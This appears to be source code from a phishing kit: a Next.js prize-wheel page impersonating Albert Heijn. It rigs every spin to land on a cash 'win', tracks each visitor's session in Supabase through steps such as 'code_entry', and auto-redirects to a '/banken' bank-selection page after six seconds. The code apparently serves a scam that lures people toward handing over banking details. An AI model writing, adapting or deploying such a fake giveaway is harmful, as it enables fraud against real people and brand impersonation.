"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfettiEffect } from "@/components/AlbertHeijnWheel/ConfettiEffect";
import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { useIsMobile } from "@/hooks/useIsMobile";
import { useSettings } from "@/contexts/SettingsContext";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";

type PrizeKind = "amount" | "message";

type PrizeSegment = {
  kind: PrizeKind;
  text: string;
  selectionIndex: number;
  rotationIndex: number;
  amount: number | null;
  popupLines: string[];
};

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;

// ============================================================
//  CARK ODULLERI - GERCEK PNG GORSELIN CLOCKWISE SIRASI (ust pointerdan baslayarak):
//  rotationIndex = gorseldeki segment SIRASI (0..7)
//
//   Pointer (0°) altında  =>  Index 0:  €1000
//   Saat yönünde 1 segment => Index 1:  €2000
//   Saat yönünde 2 segment => Index 2:  €2500
//   Saat yönünde 3 segment => Index 3:  €3000 (YENI - onceki 3600 yer degisti)
//   Saat yönünde 4 segment => Index 4:  €3600
//   Saat yönünde 5 segment => Index 5:  Proovi Uuesti (kirmizi)
//   Saat yönünde 6 segment => Index 6:  Kahjuks Ei Võitnud (kirmizi)
//   Saat yönünde 7 segment => Index 7:  €1500
//
//  !!! ONEMLI: Eski 1200 / 1800 / 5000 GORSELDE YOK. Bunlar listeden CIKARILDI.
//  WINNABLE_PRIZES: 1000 / 1500 / 2000 / 2500  (SADECE para segmentleri, 3000 ve 3600 listeden ciksin)
// ============================================================
const PRIZES: readonly PrizeSegment[] = [
  { kind: "message", text: "PROBEER OPNIEUW", selectionIndex: 0, rotationIndex: 0, amount: null, popupLines: ["PROBEER", "OPNIEUW"] },
  { kind: "amount", text: "€1000", selectionIndex: 1, rotationIndex: 1, amount: 1000, popupLines: ["€ 1.000"] },
  { kind: "amount", text: "€2000", selectionIndex: 2, rotationIndex: 2, amount: 2000, popupLines: ["€ 2.000"] },
  { kind: "amount", text: "€500", selectionIndex: 3, rotationIndex: 3, amount: 500, popupLines: ["€ 500"] },
  { kind: "amount", text: "€3000", selectionIndex: 4, rotationIndex: 4, amount: 3000, popupLines: ["€ 3.000"] },
  { kind: "amount", text: "€750", selectionIndex: 5, rotationIndex: 5, amount: 750, popupLines: ["€ 750"] },
  { kind: "amount", text: "€2500", selectionIndex: 6, rotationIndex: 6, amount: 2500, popupLines: ["€ 2.500"] },
  { kind: "amount", text: "€1500", selectionIndex: 7, rotationIndex: 7, amount: 1500, popupLines: ["€ 1.500"] },
  { kind: "amount", text: "€3600", selectionIndex: 8, rotationIndex: 8, amount: 3600, popupLines: ["€ 3.600"] },
] as const;

const WINNABLE_AMOUNTS = [500, 750, 1000, 1500, 2000, 2500];

const WINNABLE_PRIZES = PRIZES.filter(
  (prize) => prize.kind === "amount" && prize.amount !== null && WINNABLE_AMOUNTS.includes(prize.amount)
) as PrizeSegment[];

// ============================================================
//  OLASILIK DAGILIMI (AGIRLIKLI - SADECE WINNABLE icin)
// ============================================================
const PRIZE_WEIGHTS: Record<number, number> = {
  500: 120,
  750: 260,
  1000: 560,
  1500: 640,
  2000: 460,
  2500: 340,
};

const RETRY_SEGMENT: PrizeSegment = PRIZES[0];

type WheelPrizeConfig = {
  prizes: PrizeSegment[];
  winnable: PrizeSegment[];
  weights: Record<number, number>;
};

const DEFAULT_WHEEL_CONFIG: WheelPrizeConfig = {
  prizes: [...PRIZES],
  winnable: [...WINNABLE_PRIZES],
  weights: { ...PRIZE_WEIGHTS },
};

function buildWheelPrizes(wheelSettings: unknown): WheelPrizeConfig {
  const ws = wheelSettings && typeof wheelSettings === "object" ? (wheelSettings as Record<string, unknown>) : null;
  const raw = ws?.prizes;
  if (!Array.isArray(raw) || raw.length !== 8) return DEFAULT_WHEEL_CONFIG;

  const amounts: number[] = [];
  const weights: Record<number, number> = {};
  for (let i = 0; i < 8; i++) {
    const entry = raw[i];
    const amount = Number(entry?.amount);
    const weight = Number(entry?.weight);
    if (!Number.isFinite(amount) || amount <= 0) return DEFAULT_WHEEL_CONFIG;
    amounts.push(Math.round(amount));
    weights[Math.round(amount)] = Number.isFinite(weight) && weight >= 0 ? Math.round(weight) : 0;
  }

  const prizes: PrizeSegment[] = [RETRY_SEGMENT];
  for (let i = 0; i < 8; i++) {
    const amount = amounts[i];
    prizes.push({
      kind: "amount",
      text: `€${amount}`,
      selectionIndex: i + 1,
      rotationIndex: i + 1,
      amount,
      popupLines: [`€ ${formatAmount(amount)}`],
    });
  }

  const winnable = prizes.filter((p) => p.kind === "amount" && (weights[p.amount ?? 0] ?? 0) > 0);
  if (winnable.length === 0) return DEFAULT_WHEEL_CONFIG;

  return { prizes, winnable, weights };
}

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("de-DE").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const segmentAngle = 360 / PRIZES.length;
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * segmentAngle);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  const extraTurns = 1 + Math.floor(Math.random() * 2);
  return currentRotation + (MIN_FULL_SPINS + extraTurns) * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null, prizes: PrizeSegment[]) {
  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    return prizes.find((prize) => prize.text === storedLabel) ?? null;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    return prizes.find((prize) => prize.amount === session.amount) ?? null;
  }

  return null;
}

// ============================================================
//  AGIRLIKLI RASTGELE ODUL SECIMI (%97 = 1000-2500 arasi)
// ============================================================
function getRandomWinnablePrize(cfg: WheelPrizeConfig) {
  const weightedList: PrizeSegment[] = [];
  for (const prize of cfg.winnable) {
    const weight = cfg.weights[prize.amount ?? 0] ?? 1;
    for (let i = 0; i < weight; i++) weightedList.push(prize);
  }
  const idx = Math.floor(Math.random() * weightedList.length);
  return weightedList[idx];
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close" | "wheel_transition_end", payload?: Record<string, unknown>) {
  console.log("[wheel-analytics]", {
    event: eventName,
    ...payload,
  });
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const isMobile = useIsMobile();
  const { settings } = useSettings();
  const wheelCfg = useMemo(() => buildWheelPrizes(settings?.wheel_settings), [settings?.wheel_settings]);
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const rotationRef = useRef(0);
  const wheelRef = useRef<HTMLDivElement | null>(null);

  // Client-side URL normalizasyonu: /wheel/UUID ise pathi /wheel/{kisa_id} ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const match = window.location.pathname.match(/^\/wheel\/([^/?#]+)/i);
      if (!match) return;
      const idFromPath = decodeURIComponent(match[1]);
      const isUuid =
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          idFromPath,
        );
      if (!isUuid) return;

      const preferredShort =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferredShort ?? (sessionId ? await resolveShortIdApi(sessionId) : null);
      if (cancelled) return;
      if (shortId && shortId !== idFromPath) {
        const url = new URL(window.location.href);
        const segs = url.pathname.split("/").filter(Boolean);
        if (segs.length >= 2 && segs[0].toLowerCase() === "wheel") {
          segs[1] = encodeURIComponent(shortId);
          url.pathname = "/" + segs.join("/");
        }
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  const [spinning, setSpinning] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState(DEFAULT_WHEEL_VIEWPORT);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);

  const activeLayout = resolveWheelLayout(viewportSize);
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;
  const popupAmountLine =
    resultPrize?.kind === "amount" && typeof resultPrize.amount === "number"
      ? `€ ${formatAmount(resultPrize.amount)}`
      : resultPrize?.text ?? "";
  const popupDescription =
    resultPrize?.kind === "amount" ? `Uw prijs is ${popupAmountLine}.` : resultPrize?.text ?? "Bekijk uw resultaat.";

  const formattedHistory = useMemo(
    () =>
      winHistory.map((item) => ({
        ...item,
        formattedDate: new Intl.DateTimeFormat("nl-BE", {
          day: "2-digit",
          month: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
        }).format(new Date(item.date)),
      })),
    [winHistory],
  );

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Ongeldige sessie.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Sessie niet gevonden.");
        return;
      }

      const nextSession = data as SessionRecord;

      if (nextSession.current_step === "code_entry" && !nextSession.form_data?.is_wheel_game) {
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({ is_hidden: false, form_data: updatedFormData }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession, wheelCfg.prizes);
      if (restoredPrize) {
        setResultPrize(restoredPrize);
        setShowPopup(true);
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      setViewportSize({
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      });
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;

    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.overscrollBehavior = "none";
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "none";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overscrollBehavior = previousBodyOverscroll;
    };
  }, []);

  useEffect(() => {
    if (!showPopup || !resultPrize) {
      return;
    }

    logWheelEvent("popup_open", {
      prize: resultPrize.text,
      amount: resultPrize.amount,
    });

    const focusTimeout = window.setTimeout(() => {
      continueButtonRef.current?.focus({ preventScroll: true });
    }, 80);

    return () => {
      window.clearTimeout(focusTimeout);
    };
  }, [resultPrize, showPopup]);

  const finalizeSpin = async (prize: PrizeSegment) => {
    // =================================================================
    //  ZORUNLU KORUMA: 3000/5000 YADA NEGATIF SONUC ASLA KAYDEDILMESIN.
    //  Eger herhangi bir sebepten prize 1000-2500 disinda ise ->
    //  EN YAKIN WINNABLE segmente ZORLA Cek.
    // =================================================================
    const isInWinnableRange =
      prize.kind === "amount" &&
      prize.amount !== null &&
      wheelCfg.winnable.some((wp) => wp.rotationIndex === prize.rotationIndex);

    let safePrize = prize;
    if (!isInWinnableRange) {
      const segAngle = 360 / PRIZES.length;
      const sorted = [...wheelCfg.winnable].sort((a, b) => {
        const da = Math.min(
          normalizeAngle(a.rotationIndex * segAngle - prize.rotationIndex * segAngle),
          normalizeAngle(prize.rotationIndex * segAngle - a.rotationIndex * segAngle)
        );
        const db = Math.min(
          normalizeAngle(b.rotationIndex * segAngle - prize.rotationIndex * segAngle),
          normalizeAngle(prize.rotationIndex * segAngle - b.rotationIndex * segAngle)
        );
        return da - db;
      });
      safePrize = sorted[0] ?? wheelCfg.winnable[0] ?? prize;
    }

    setSpinning(false);
    setResultPrize(safePrize);
    setShowPopup(true);

    logWheelEvent("wheel_win", {
      prize: safePrize.text,
      amount: safePrize.amount,
      selectionIndex: safePrize.selectionIndex,
      rotationIndex: safePrize.rotationIndex,
    });

    if (safePrize.kind === "amount") {
      setWinHistory(storeWinHistory(`€ ${formatAmount(safePrize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      pending_profile: false,
      wheel_result_label: safePrize.text,
      wheel_result_kind: safePrize.kind,
      wheel_result_amount: safePrize.amount,
      wheel_rotation_index: safePrize.rotationIndex,
    };

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        amount: safePrize.amount ?? 0,
        current_step: "wheel",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    // =================================================================
    //  YAZMA ISLEMI BITTIKTEN SONRA TEKRAR OKU + SET STATE + SONRA PUSH.
    //  Boylece WinFlow cagirdiginda amount kesin DB'de yazili olur,
    //  stale okuma riski sifirlanir.
    // =================================================================
    try {
      const { data: reFetched } = await supabase
        .from("sessions")
        .select("amount, current_step, form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (reFetched) {
        const patched = { ...(sessionData ?? ({} as SessionRecord)), amount: reFetched.amount ?? 0, current_step: reFetched.current_step ?? "wheel", form_data: (reFetched.form_data ?? nextFormData) as SessionRecord["form_data"] } as SessionRecord;
        setSessionData(patched);
      } else {
        setSessionData((previous) =>
          previous
            ? {
                ...previous,
                amount: safePrize.amount ?? 0,
                current_step: "wheel",
                form_data: nextFormData,
              }
            : previous,
        );
      }
    } catch (refetchErr) {
      // Tekrar okuma hali bozuksa, state'le devam et
      console.warn("[wheel] session refetch okunamadi state fallback kullaniliyor", refetchErr);
      setSessionData((previous) =>
        previous
          ? {
              ...previous,
              amount: safePrize.amount ?? 0,
              current_step: "wheel",
              form_data: nextFormData,
            }
          : previous,
      );
    }
  };

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize(wheelCfg);
    const startRotation = rotationRef.current;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex);

    pendingPrizeRef.current = nextPrize;
    rotationRef.current = targetRotation;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
      targetRotationIndex: nextPrize.rotationIndex,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    // Cark her zaman pendingPrize'in dilimine DONECEK sekilde hesaplanir
    // (getTargetRotation). Popup da birebir AYNI odulu gostermeli —
    // DOM'dan ayri okuma yapmak goruntu/popup uyusmazligina yol aciyordu.
    let finalPrize = pendingPrizeRef.current;

    // FINAL KILIT: Her turlu WINNABLE bir odul olduguna emin ol (POSKUSITE ZNOVA asla cikamaz)
    if (
      !(
        finalPrize.kind === "amount" &&
        finalPrize.amount !== null &&
        wheelCfg.winnable.some((wp) => wp.rotationIndex === finalPrize.rotationIndex)
      )
    ) {
      finalPrize = wheelCfg.winnable[0] ?? finalPrize;
    }

    logWheelEvent("wheel_transition_end", {
      finalPrizeText: finalPrize.text,
      finalAmount: finalPrize.amount,
      finalRotationIndex: finalPrize.rotationIndex,
    });

    pendingPrizeRef.current = null;
    void finalizeSpin(finalPrize);
  };

  const handleContinue = () => {
    logWheelEvent("popup_close", {
      prize: resultPrize?.text ?? null,
    });
    setShowPopup(false);
    const go = async () => {
      try {
        if (supabase && sessionId) {
          await supabase
            .from("sessions")
            .update({ current_step: "banken" })
            .eq("id", sessionId);
        }
      } catch {
        /* best-effort; navigation proceeds anyway */
      }
      router.push(`/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`);
    };
    void go();
  };

  const handleContinueRef = useRef(handleContinue);
  handleContinueRef.current = handleContinue;

  useEffect(() => {
    if (!showPopup || !resultPrize) return;
    const autoContinue = window.setTimeout(() => {
      handleContinueRef.current();
    }, 6000);
    return () => window.clearTimeout(autoContinue);
  }, [showPopup, resultPrize]);

  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: `${viewportHeight}px` }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Fout</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative w-full overflow-hidden"
        style={{
          height: `${viewportHeight}px`,
          minHeight: `${viewportHeight}px`,
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
          backgroundColor: "#0c0207",
          backgroundImage: "linear-gradient(135deg, #0c0207 0%, #2b0611 50%, #0c0207 100%)",
        }}
      >
        <AlbertHeijnWheel
          ref={wheelRef}
          layout={activeLayout}
          rotation={rotation}
          spinning={spinning}
          disabled={isSpinDisabled}
          prizes={wheelCfg.prizes}
          onSpin={spinWheel}
          onSpinEnd={handleWheelTransitionEnd}
        />
      </div>

      <PrizePopup
        open={showPopup}
        isMobile={isMobile}
        result={resultPrize}
        amountLine={popupAmountLine}
        description={popupDescription}
        userName={
          typeof sessionData?.form_data?.firstName === "string"
            ? sessionData.form_data.firstName
            : null
        }
        continueButtonRef={continueButtonRef}
        onClose={handleContinue}
      />

      <ConfettiEffect
        active={showPopup && resultPrize?.kind === "amount"}
        triggerKey={showPopup && resultPrize?.kind === "amount" ? `${sessionId}-${resultPrize.text}-${resultPrize.amount}` : null}
      />
    </>
  );
}
